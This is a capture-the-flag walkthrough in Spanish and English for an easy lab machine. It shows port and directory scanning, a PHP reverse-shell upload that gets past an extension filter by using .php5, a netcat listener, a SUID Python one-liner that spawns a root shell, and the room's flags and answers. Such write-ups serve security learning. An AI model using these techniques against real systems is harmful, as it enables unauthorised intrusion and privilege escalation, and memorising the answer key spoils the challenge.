#Level-easy 
# First, let's get information about the target.
### Escaneo de puertos:
```shell
┌──(kali㉿kali)-[~]
└─$ nmap -sV 10.10.176.143
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 16:55 EDT
Nmap scan report for 10.10.176.143
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Answer the questions below
  
>Scan the machine, how many ports are open?
 **2**

>What version of Apache is running?
 **2.4.29**

>What service is running on port 22?
 **ssh**

>Find directories on the web server using the GoBuster tool.  
 no answer needed


### Escaneo de directorios en el servidor web
```shell
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u 10.10.176.143 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.176.143
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.10.176.143/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.10.176.143/js/]
/panel                (Status: 301) [Size: 314] [--> http://10.10.176.143/panel/]
/server-status        (Status: 403) [Size: 278]
/uploads              (Status: 301) [Size: 316] [--> http://10.10.176.143/uploads/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================

```


>What is the hidden directory?
 **/panel/**


# Find a form to upload and get a reverse shell, and find the flag.

Para esto, usaré el infame php-reverse-shell.php de pentestmonkey. Puedes conseguirlo aquí:

[https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

(solo hay que cambiar algunos parametros)
![[0_JYDqpybcaSPzCRiE.png]]


pero al subir el archivo nos dice que no se aceptan php

![[Pasted image 20231018152054.png]]

investigando un poco un archivo php puede tener multiples extenciones como:
.**php3, .php4, .php5, .php7, .pthml, .pht.**

intentamos con esas y **php5** funciono 

![[Pasted image 20231018160125.png]]

verificamos que se haya subido bien 
![[Pasted image 20231018160811.png]]

iniciamos un listener en el puerto que pusimos en el exploit 4444
El comando nc es un comando de sistemas Unix que se usa para llevar a cabo diversas tareas de red.

- **-l**: Pone a Netcat en modo de escucha, esperando conexiones entrantes.
- **-v**: Activa el modo verbose, mostrando información adicional sobre la conexión.
- **-n**: Evita que Netcat haga la resolución de nombres de dominio, usando sólo direcciones IP numéricas.
- **-p**: Especifica el puerto local al que se conecta Netcat.
- 
![[Pasted image 20231018160849.png]]

para ejecutar en exploit hacemos  clic en el ex.php5 en el directorio /**upload/** y cambie a la ventana de terminal netcat.

ESTAMOS DENTRO!!!
![[Pasted image 20231018162819.png]]

con ayuda del comando find buscamos la bandera que se nos dijo estaba en el archivo user.txt
![[Pasted image 20231018163142.png]]

  
>user.txt
**THM{y0u_g0t_a_sh3ll}**


# Now that we have a shell, let's escalate our privileges to root.

  
>Search for files with SUID permission, which file is weird? 
 **/usr/bin/python**


Usamos go awayBins para verificar la lista de archivos con un conjunto de bits SUID y determinar cuáles se pueden usar para escalar privilegios:
https://gtfobins.github.io/

![[Pasted image 20231018164720.png]]

  
> Find a form to escalate your privileges.

```python
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
root

```


buscamos el archivo root.txt
```shell
find / -type f -name root.txt 
/root/root.txt
cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

>root.txt
 **THM{pr1v1l3g3_3sc4l4t10n}**
